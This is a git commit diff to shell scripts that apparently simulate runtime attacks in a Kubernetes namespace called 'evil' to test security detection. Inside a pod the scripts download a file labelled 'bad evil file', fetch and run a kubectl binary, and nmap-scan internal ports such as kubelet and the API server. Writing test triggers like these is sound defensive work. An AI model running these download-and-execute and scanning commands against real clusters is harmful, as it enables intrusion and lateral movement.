8e5fdae6a8df5ef706df47e81ec4c1c44dbc87d0
pasq <p.russiello@libero.it>
2021-05-21 11:33:22 +0100

    updated prep scripts

--- files/deploy.sh
+++ files/deploy.sh
@@ -1,4 +1,5 @@
 !/bin/bash
+export KUBECONFIG=/var/www/.kube/config
 kubectl create ns evil
 kubectl delete --ignore-not-found=true -f /var/www/html/deploy.yml -n evil'
 kubectl apply -f /var/www/html/deploy.yml -n evil
--- files/runtime_attacks.sh
+++ files/runtime_attacks.sh
@@ -5,13 +5,13 @@ export KUBECONFIG=/var/www/.kube/config
 PO=$(kubectl get po -n evil|grep evil| awk '{ print $1 }')
 
 echo "DL bad evil file"
-kubectl exec $PO -n evil -- bash -c "curl https://cdn.twistlock.com/john/evil -o evil"&
+kubectl exec $PO -n evil -- bash -c "curl https://cdn.twistlock.com/john/evil -o evil"
 
 echo "Kubernetes attack"
-kubectl exec $PO -n evil -- bash -c "curl https://storage.googleapis.com/kubernetes-release/release/v1.18.0/bin/linux/amd64/kubectl -o kubectl; chmod +x ./kubectl ; ./kubectl version --client"&
+kubectl exec $PO -n evil -- bash -c "curl https://storage.googleapis.com/kubernetes-release/release/v1.18.0/bin/linux/amd64/kubectl -o kubectl; chmod +x ./kubectl ; ./kubectl version --client"
 
 echo "bad domain"
-kubectl exec $PO -n evil -- bash -c "curl github.com"&
+kubectl exec $PO -n evil -- bash -c "curl github.com"
 
 echo "bad port scanning"
-kubectl exec $PO -n evil -- bash -c "nmap -p 80,8080,8081,8082,8083,8084,2375,10250,6443,9998 10.32.0.24"&
+kubectl exec $PO -n evil -- bash -c "nmap -p 80,8080,8081,8082,8083,8084,2375,10250,6443,9998 10.32.0.24"
